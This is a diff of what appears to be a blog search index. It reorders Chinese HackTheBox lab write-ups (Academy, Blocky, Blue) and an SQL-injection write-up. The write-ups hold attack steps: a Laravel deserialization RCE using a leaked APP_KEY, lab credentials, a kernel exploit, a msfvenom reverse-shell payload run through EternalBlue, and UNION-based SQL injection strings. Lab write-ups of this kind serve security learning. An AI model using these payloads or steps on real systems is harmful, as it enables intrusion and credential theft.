@@ -253,6 +253,78 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB:Academy</title>
+    <url>/2020/11/28/HTB-Academy/</url>
+    <content><![CDATA[<h1 id="Academy"><a href="#Academy" class="headerlink" title="Academy"></a>Academy</h1><p>添加hosts</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.215    academy.htb</span><br></pre></td></tr></table></figure>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Academy/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>目录枚举</p>
+<p><img src="/images/Academy/2.png" alt="2"></p>
+<p>发现了几个重要的信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login.php			登录页面</span><br><span class="line">register.php		注册页面</span><br><span class="line">admin.php			疑似后台登录</span><br><span class="line">config.php			空白</span><br></pre></td></tr></table></figure>
+
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>先注册账号进去</p>
+<p><img src="/images/Academy/3.png" alt="3"></p>
+<p>看起来网站内容还挺多，检查了主页半天， 没发现什么奇怪的点。开启burpsuite重新检查每一个请求，有了发现</p>
+<p>注册页面提交了roleid参数，疑似跟身份权限有关</p>
+<p><img src="/images/Academy/4.png" alt="4"></p>
+<p>修改为1然后提交，尝试登录后台admin.php</p>
+<p><img src="/images/Academy/5.png" alt="5"></p>
+<p>登录成功，提示了新域名存在问题，添加到hosts里</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.215    academy.htb dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>
+
+<p>页面存在很多信息泄露，看来个测试页</p>
+<p><img src="/images/Academy/6.png" alt="6"></p>
+<p>从中得到了目标网站运行着Laravel(php框架)，并且泄露了APP_KEY。APP_KEY应该是Laravel中某些地方加密用到的密钥，比如cookie。</p>
+<p>寻找漏洞</p>
+<p><img src="/images/Academy/7.png" alt="7"></p>
+<p>发现了msf可以使用的RCE，根据描述来看</p>
+<p>这是一个反序列化漏洞，可以在http头X-XSRF-TOKEN中注入payload，前提是知道app_key，需要用它来进行加密</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set APP_KEY dBLUaMuZz7Iq06XtL&#x2F;Xnz&#x2F;90Ejq+DEEynggqubHWFj0&#x3D;</span><br><span class="line">set RHOST 10.10.10.215</span><br><span class="line">set VHOST dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>
+
+<p>别忘了设置vhost</p>
+<p><img src="/images/Academy/8.png" alt="8"></p>
+<p>这个payload的http请求如下</p>
+<p><img src="/images/Academy/9.png" alt="9"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>存在的用户</p>
+<p><img src="/images/Academy/10.png" alt="10"></p>
+<h3 id="user1"><a href="#user1" class="headerlink" title="user1"></a>user1</h3><p>机器存在3306端口，尝试寻找数据库连接凭据。在laravel中一般存储在.env</p>
+<p><img src="/images/Academy/11.png" alt="11"></p>
+<p>数据库登不上去，尝试密码复用</p>
+<p><code>cry0l1t3/mySup3rP4s5w0rd!!</code></p>
+<p><img src="/images/Academy/13.png" alt="13"></p>
+<p>不过用户没有sudo权限</p>
+<h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>用户1的组有点意思，属于adm</p>
+<p><img src="/images/Academy/14.png" alt="14"></p>
+<p>adm组用于监视系统任务，可以读取/var/log下的许多日志，下一步应该检查那里</p>
+<p>这里发现了目录audit。SELinux 预设会透过 Linux 审计系统 auditd将日志写在 /var/log/audit/audit.log。它会记录一些如系统调用，文件修改，执行的程序，系统登入登出等有关安全的操作事件。</p>
+<p>这里好累，日志太多了，这里有描述的意思</p>
+<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-understanding_audit_log_files">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-understanding_audit_log_files</a></p>
+<p><a href="https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details">https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details</a></p>
+<p>慢慢找呗</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat * |grep &quot;[^a]uid&#x3D;100[01234]&quot;|grep &quot;type&#x3D;TTY&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Academy/15.png" alt="15"></p>
+<p>发现auditd竟然记下来用户的凭据</p>
+<p>后面发现，直接找敏感的命令，可能会好些，一开始没想到su</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -Ri &#39;comm&#x3D;&quot;su&quot;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><code>6D7262336E5F41634064336D79210A</code>看样子是hex编码后的内容，尝试解码得到<code>mrb3n_Ac@d3my!</code>，不过密码不是uid1002的，而是</p>
+<p><code>mrb3n/mrb3n_Ac@d3my!</code></p>
+<p><img src="/images/Academy/16.png" alt="16"></p>
+<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>root反而简单了，直接找到了sudo命令composer</p>
+<p><img src="/images/Academy/17.png" alt="17"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最耗时间的地方在横向移动到第二个用户的时候，日志太多，不熟悉的情况下，不确定是否应该花费大量时间去寻找</p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB:Access</title>
     <url>/2020/10/25/HTB-Access/</url>
     <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Access/1.png" alt="1"></p>
@@ -346,78 +418,6 @@
       </categories>
       <tags>
         <tag>Windows靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:Academy</title>
-    <url>/2020/11/28/HTB-Academy/</url>
-    <content><![CDATA[<h1 id="Academy"><a href="#Academy" class="headerlink" title="Academy"></a>Academy</h1><p>添加hosts</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.215    academy.htb</span><br></pre></td></tr></table></figure>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Academy/1.png" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>目录枚举</p>
-<p><img src="/images/Academy/2.png" alt="2"></p>
-<p>发现了几个重要的信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login.php			登录页面</span><br><span class="line">register.php		注册页面</span><br><span class="line">admin.php			疑似后台登录</span><br><span class="line">config.php			空白</span><br></pre></td></tr></table></figure>
-
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>先注册账号进去</p>
-<p><img src="/images/Academy/3.png" alt="3"></p>
-<p>看起来网站内容还挺多，检查了主页半天， 没发现什么奇怪的点。开启burpsuite重新检查每一个请求，有了发现</p>
-<p>注册页面提交了roleid参数，疑似跟身份权限有关</p>
-<p><img src="/images/Academy/4.png" alt="4"></p>
-<p>修改为1然后提交，尝试登录后台admin.php</p>
-<p><img src="/images/Academy/5.png" alt="5"></p>
-<p>登录成功，提示了新域名存在问题，添加到hosts里</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.215    academy.htb dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>
-
-<p>页面存在很多信息泄露，看来个测试页</p>
-<p><img src="/images/Academy/6.png" alt="6"></p>
-<p>从中得到了目标网站运行着Laravel(php框架)，并且泄露了APP_KEY。APP_KEY应该是Laravel中某些地方加密用到的密钥，比如cookie。</p>
-<p>寻找漏洞</p>
-<p><img src="/images/Academy/7.png" alt="7"></p>
-<p>发现了msf可以使用的RCE，根据描述来看</p>
-<p>这是一个反序列化漏洞，可以在http头X-XSRF-TOKEN中注入payload，前提是知道app_key，需要用它来进行加密</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set APP_KEY dBLUaMuZz7Iq06XtL&#x2F;Xnz&#x2F;90Ejq+DEEynggqubHWFj0&#x3D;</span><br><span class="line">set RHOST 10.10.10.215</span><br><span class="line">set VHOST dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>
-
-<p>别忘了设置vhost</p>
-<p><img src="/images/Academy/8.png" alt="8"></p>
-<p>这个payload的http请求如下</p>
-<p><img src="/images/Academy/9.png" alt="9"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>存在的用户</p>
-<p><img src="/images/Academy/10.png" alt="10"></p>
-<h3 id="user1"><a href="#user1" class="headerlink" title="user1"></a>user1</h3><p>机器存在3306端口，尝试寻找数据库连接凭据。在laravel中一般存储在.env</p>
-<p><img src="/images/Academy/11.png" alt="11"></p>
-<p>数据库登不上去，尝试密码复用</p>
-<p><code>cry0l1t3/mySup3rP4s5w0rd!!</code></p>
-<p><img src="/images/Academy/13.png" alt="13"></p>
-<p>不过用户没有sudo权限</p>
-<h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>用户1的组有点意思，属于adm</p>
-<p><img src="/images/Academy/14.png" alt="14"></p>
-<p>adm组用于监视系统任务，可以读取/var/log下的许多日志，下一步应该检查那里</p>
-<p>这里发现了目录audit。SELinux 预设会透过 Linux 审计系统 auditd将日志写在 /var/log/audit/audit.log。它会记录一些如系统调用，文件修改，执行的程序，系统登入登出等有关安全的操作事件。</p>
-<p>这里好累，日志太多了，这里有描述的意思</p>
-<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-understanding_audit_log_files">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-understanding_audit_log_files</a></p>
-<p><a href="https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details">https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details</a></p>
-<p>慢慢找呗</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat * |grep &quot;[^a]uid&#x3D;100[01234]&quot;|grep &quot;type&#x3D;TTY&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Academy/15.png" alt="15"></p>
-<p>发现auditd竟然记下来用户的凭据</p>
-<p>后面发现，直接找敏感的命令，可能会好些，一开始没想到su</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -Ri &#39;comm&#x3D;&quot;su&quot;&#39;</span><br></pre></td></tr></table></figure>
-
-<p><code>6D7262336E5F41634064336D79210A</code>看样子是hex编码后的内容，尝试解码得到<code>mrb3n_Ac@d3my!</code>，不过密码不是uid1002的，而是</p>
-<p><code>mrb3n/mrb3n_Ac@d3my!</code></p>
-<p><img src="/images/Academy/16.png" alt="16"></p>
-<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>root反而简单了，直接找到了sudo命令composer</p>
-<p><img src="/images/Academy/17.png" alt="17"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最耗时间的地方在横向移动到第二个用户的时候，日志太多，不熟悉的情况下，不确定是否应该花费大量时间去寻找</p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -1053,62 +1053,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB:Blocky</title>
-    <url>/2020/10/22/HTB-Blocky/</url>
-    <content><![CDATA[<h1 id="Blocky"><a href="#Blocky" class="headerlink" title="Blocky"></a>Blocky</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blocky/1.png" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首先检查21端口，它存在一个文件复制(需要登录)、RCE漏洞(需要写webshell)，都无法利用，直接放弃</p>
-<p>80端口发现wordpress</p>
-<p>目录枚举</p>
-<p><img src="/images/Blocky/4.png" alt="4"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>对wordpress枚举</p>
-<p>用户名枚举</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;10.10.10.37&#x2F; --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Blocky/2.png" alt="2"></p>
-<p>插件枚举</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;10.10.10.37&#x2F; --disable-tls-checks --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Blocky/3.png" alt="3"></p>
-<p>查看之前发现的<code>plugins</code>目录，发现了一些东西(这个URL具有迷惑性，它并不是<code>/wp-content/plugins</code>)</p>
-<p><img src="/images/Blocky/5.png" alt="5"></p>
-<p>得到两个jar文件，解压它们</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -xvf filename</span><br></pre></td></tr></table></figure>
-
-<p>之后会发现一个文件<code>BlockyCore.class</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file BlockyCore.class </span><br><span class="line">BlockyCore.class: compiled Java class data, version 52.0 (Java 1.8)</span><br></pre></td></tr></table></figure>
-
-<p>使用jad反编译它(下载地址:<a href="http://varaneckas.com/jad/jad158e.linux.static.zip">http://varaneckas.com/jad/jad158e.linux.static.zip</a>)</p>
-<p><img src="/images/Blocky/6.png" alt="6"></p>
-<p>获取凭据<code>8YsqfCTnvxAUeduzjNSXe22</code></p>
-<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>密码复用，一键提权</p>
-<p><img src="/images/Blocky/7.png" alt="7"></p>
-<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>使用sql连接凭据登录到phpmyadmin</p>
-<p><img src="/images/Blocky/8.png" alt="8"></p>
-<p>不需要破解，通过password_hash()，创建一个已知的MD5hash</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; echo password_hash(&quot;evil&quot;, PASSWORD_DEFAULT);</span><br><span class="line">$2y$10$jdC4&#x2F;HEq5F9l9ISP8r3bA.sFgSGJm0APB1JkND&#x2F;z.6563dqMOo.TK</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Blocky/9.png" alt="9"></p>
-<p>使用它们登录进wordpress后台，进行getshell</p>
-<p><img src="/images/Blocky/10.png" alt="10"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核版本信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4.4.0-62-generic</span><br><span class="line">Ubuntu 16.04.2 LTS</span><br></pre></td></tr></table></figure>
-
-<p>找到漏洞</p>
-<p><img src="/images/Blocky/11.png" alt="11"></p>
-<p>传输过去</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc 41458.c -o pwn</span><br><span class="line">scp pwn notch@10.10.10.37:</span><br><span class="line">8YsqfCTnvxAUeduzjNSXe22</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Blocky/12.png" alt="12"></p>
-<p>非常不稳定，系统会立即崩溃</p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB:Bastion</title>
     <url>/2021/05/07/HTB-Bastion/</url>
     <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Bastion/1.png" alt="1"></p>
@@ -1162,37 +1106,6 @@
 <p><img src="/images/Bastion/14.png" alt="14"></p>
 <p>另外有一个python脚本可以快速完成这一步骤，<a href="https://github.com/haseebT/mRemoteNG-Decrypt">链接</a></p>
 <p><img src="/images/Bastion/15.png" alt="15"></p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Windows靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:Blue</title>
-    <url>/2020/06/05/HTB-Blue/</url>
-    <content><![CDATA[<h1 id="Blue"><a href="#Blue" class="headerlink" title="Blue"></a>Blue</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blue/1.jpg" alt="1"></p>
-<p>扫描之后发现了smb服务，并且机器为windows7</p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>竟然是win7，就会想到EternalBlue</p>
-<p><img src="/images/Blue/2.jpg" alt="2"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>github</p>
-<p><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
-<p>github</p>
-<p><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></p>
-<p>zzz_exploit.py</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;&lt;LAB IP&gt; lport&#x3D;&lt;PORT&gt; -f exe &gt; writeup.exe</span><br></pre></td></tr></table></figure>
-
-<p>修改exp</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb_send_file(smbConn, &#39;&#x2F;root&#x2F;Desktop&#x2F;writeups&#x2F;blue&#x2F;writeup.exe&#39;, &#39;C&#39;, &#39;&#x2F;writeup.exe&#39;)</span><br><span class="line">service_exec(conn, r&#39;cmd &#x2F;c c:\\writeup.exe&#39;)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz_exploit.py 10.10.10.40</span><br></pre></td></tr></table></figure>
-
-<p>msf</p>
-<p>windows/smb/ms17_010_eternalblue</p>
-<p><img src="/images/Blue/3.jpg" alt="3"></p>
-<p>这个漏洞在利用过程中很不稳定，不断尝试总有几次能成功</p>
 ]]></content>
       <categories>
         <category>HackTheBox</category>
@@ -1258,6 +1171,93 @@
       </categories>
       <tags>
         <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB:Blocky</title>
+    <url>/2020/10/22/HTB-Blocky/</url>
+    <content><![CDATA[<h1 id="Blocky"><a href="#Blocky" class="headerlink" title="Blocky"></a>Blocky</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blocky/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首先检查21端口，它存在一个文件复制(需要登录)、RCE漏洞(需要写webshell)，都无法利用，直接放弃</p>
+<p>80端口发现wordpress</p>
+<p>目录枚举</p>
+<p><img src="/images/Blocky/4.png" alt="4"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>对wordpress枚举</p>
+<p>用户名枚举</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;10.10.10.37&#x2F; --disable-tls-checks --enumerate u</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Blocky/2.png" alt="2"></p>
+<p>插件枚举</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxx --url http:&#x2F;&#x2F;10.10.10.37&#x2F; --disable-tls-checks --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Blocky/3.png" alt="3"></p>
+<p>查看之前发现的<code>plugins</code>目录，发现了一些东西(这个URL具有迷惑性，它并不是<code>/wp-content/plugins</code>)</p>
+<p><img src="/images/Blocky/5.png" alt="5"></p>
+<p>得到两个jar文件，解压它们</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -xvf filename</span><br></pre></td></tr></table></figure>
+
+<p>之后会发现一个文件<code>BlockyCore.class</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file BlockyCore.class </span><br><span class="line">BlockyCore.class: compiled Java class data, version 52.0 (Java 1.8)</span><br></pre></td></tr></table></figure>
+
+<p>使用jad反编译它(下载地址:<a href="http://varaneckas.com/jad/jad158e.linux.static.zip">http://varaneckas.com/jad/jad158e.linux.static.zip</a>)</p>
+<p><img src="/images/Blocky/6.png" alt="6"></p>
+<p>获取凭据<code>8YsqfCTnvxAUeduzjNSXe22</code></p>
+<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>密码复用，一键提权</p>
+<p><img src="/images/Blocky/7.png" alt="7"></p>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>使用sql连接凭据登录到phpmyadmin</p>
+<p><img src="/images/Blocky/8.png" alt="8"></p>
+<p>不需要破解，通过password_hash()，创建一个已知的MD5hash</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; echo password_hash(&quot;evil&quot;, PASSWORD_DEFAULT);</span><br><span class="line">$2y$10$jdC4&#x2F;HEq5F9l9ISP8r3bA.sFgSGJm0APB1JkND&#x2F;z.6563dqMOo.TK</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Blocky/9.png" alt="9"></p>
+<p>使用它们登录进wordpress后台，进行getshell</p>
+<p><img src="/images/Blocky/10.png" alt="10"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核版本信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4.4.0-62-generic</span><br><span class="line">Ubuntu 16.04.2 LTS</span><br></pre></td></tr></table></figure>
+
+<p>找到漏洞</p>
+<p><img src="/images/Blocky/11.png" alt="11"></p>
+<p>传输过去</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc 41458.c -o pwn</span><br><span class="line">scp pwn notch@10.10.10.37:</span><br><span class="line">8YsqfCTnvxAUeduzjNSXe22</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Blocky/12.png" alt="12"></p>
+<p>非常不稳定，系统会立即崩溃</p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB:Blue</title>
+    <url>/2020/06/05/HTB-Blue/</url>
+    <content><![CDATA[<h1 id="Blue"><a href="#Blue" class="headerlink" title="Blue"></a>Blue</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blue/1.jpg" alt="1"></p>
+<p>扫描之后发现了smb服务，并且机器为windows7</p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>竟然是win7，就会想到EternalBlue</p>
+<p><img src="/images/Blue/2.jpg" alt="2"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>github</p>
+<p><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
+<p>github</p>
+<p><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></p>
+<p>zzz_exploit.py</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;&lt;LAB IP&gt; lport&#x3D;&lt;PORT&gt; -f exe &gt; writeup.exe</span><br></pre></td></tr></table></figure>
+
+<p>修改exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb_send_file(smbConn, &#39;&#x2F;root&#x2F;Desktop&#x2F;writeups&#x2F;blue&#x2F;writeup.exe&#39;, &#39;C&#39;, &#39;&#x2F;writeup.exe&#39;)</span><br><span class="line">service_exec(conn, r&#39;cmd &#x2F;c c:\\writeup.exe&#39;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz_exploit.py 10.10.10.40</span><br></pre></td></tr></table></figure>
+
+<p>msf</p>
+<p>windows/smb/ms17_010_eternalblue</p>
+<p><img src="/images/Blue/3.jpg" alt="3"></p>
+<p>这个漏洞在利用过程中很不稳定，不断尝试总有几次能成功</p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Windows靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -1845,7 +1845,7 @@
 </tr>
 <tr>
 <td>email=evil@evil.com’ UNiON select 1,2,3,‘abc@abc.com’–+</td>
-<td>Email sent to: <a href="mailto:&#x61;&#98;&#x63;&#64;&#x61;&#98;&#99;&#x2e;&#x63;&#111;&#109;">&#x61;&#98;&#x63;&#64;&#x61;&#98;&#99;&#x2e;&#x63;&#111;&#109;</a>=&gt;2</td>
+<td>Email sent to: <a href="mailto:&#97;&#x62;&#x63;&#64;&#97;&#x62;&#99;&#46;&#99;&#x6f;&#109;">&#97;&#x62;&#x63;&#64;&#97;&#x62;&#99;&#46;&#99;&#x6f;&#109;</a>=&gt;2</td>
 </tr>
 </tbody></table>
 <p>现在要想办法构造查询的payload，而且要满足条件判断<br>这里可以通过<code>concat()</code></p>
@@ -1864,15 +1864,15 @@
 </tr>
 </thead>
 <tbody><tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 0),”!”,”<a href="mailto:&#97;&#98;&#x63;&#64;&#x61;&#98;&#x63;&#46;&#x63;&#x6f;&#x6d;">&#97;&#98;&#x63;&#64;&#x61;&#98;&#x63;&#46;&#x63;&#x6f;&#x6d;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 0),”!”,”<a href="mailto:&#97;&#x62;&#x63;&#x40;&#97;&#98;&#99;&#46;&#x63;&#x6f;&#109;">&#97;&#x62;&#x63;&#x40;&#97;&#98;&#99;&#46;&#x63;&#x6f;&#109;</a>“)–+</td>
 <td>groups</td>
 </tr>
 <tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 1),”!”,”<a href="mailto:&#x61;&#x62;&#x63;&#64;&#97;&#98;&#99;&#46;&#99;&#x6f;&#109;">&#x61;&#x62;&#x63;&#64;&#97;&#98;&#99;&#46;&#99;&#x6f;&#109;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 1),”!”,”<a href="mailto:&#97;&#98;&#99;&#64;&#x61;&#98;&#99;&#x2e;&#x63;&#x6f;&#109;">&#97;&#98;&#99;&#64;&#x61;&#98;&#99;&#x2e;&#x63;&#x6f;&#109;</a>“)–+</td>
 <td>license</td>
 </tr>
 <tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 2),”!”,”<a href="mailto:&#x61;&#98;&#x63;&#x40;&#97;&#x62;&#x63;&#46;&#x63;&#x6f;&#109;">&#x61;&#98;&#x63;&#x40;&#97;&#x62;&#x63;&#46;&#x63;&#x6f;&#109;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 2),”!”,”<a href="mailto:&#x61;&#x62;&#x63;&#64;&#97;&#x62;&#x63;&#x2e;&#x63;&#x6f;&#109;">&#x61;&#x62;&#x63;&#64;&#97;&#x62;&#x63;&#x2e;&#x63;&#x6f;&#109;</a>“)–+</td>
 <td>operators</td>
 </tr>
 </tbody></table>
@@ -1887,15 +1887,15 @@
 </tr>
 </thead>
 <tbody><tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 0),”!”,”<a href="mailto:&#x61;&#x62;&#x63;&#64;&#x61;&#98;&#x63;&#46;&#x63;&#x6f;&#109;">&#x61;&#x62;&#x63;&#64;&#x61;&#98;&#x63;&#46;&#x63;&#x6f;&#109;</a>“)–+</td>
